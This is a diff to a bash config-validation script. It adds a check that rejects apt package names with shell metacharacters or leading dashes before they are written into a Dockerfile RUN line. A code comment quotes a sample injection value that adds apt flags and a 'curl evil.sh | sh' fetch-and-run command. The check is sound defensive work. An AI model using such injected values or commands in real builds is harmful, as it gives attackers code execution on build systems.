@@ -132,6 +132,23 @@ while IFS= read -r entry; do
 done < <(_yq '.tcp_egress // [] | .[]' "$RUNNER_YML")
 
 # ============================================================================
+# 4b. apt: package name validation (H1)
+# ============================================================================
+# Apt package names per Debian Policy §5.6.7: lower-case letters, digits,
+# plus, minus, period; must start with alphanumeric. We're stricter than
+# the spec — reject anything that could be misinterpreted as a shell
+# metachar or apt option flag (no leading dash). The compose-image.sh
+# step writes these into a Dockerfile RUN line; without this guard a
+# malicious name like '-y --allow-downgrades; curl evil.sh | sh' would
+# inject during image build.
+while IFS= read -r pkg; do
+    [[ "$pkg" == "null" || -z "$pkg" ]] && continue
+    if ! echo "$pkg" | grep -qE '^[a-z0-9][a-z0-9+.-]*$'; then
+        _err "apt entry '$pkg' is invalid — package names must match Debian policy: lowercase letters, digits, '+', '-', '.', and must start with alphanumeric"
+    fi
+done < <(_yq '.apt // [] | .[]' "$RUNNER_YML")
+
+# ============================================================================
 # 5. dns: optional block validation
 # ============================================================================
 dns_exists=$(_yq 'has("dns")' "$RUNNER_YML")
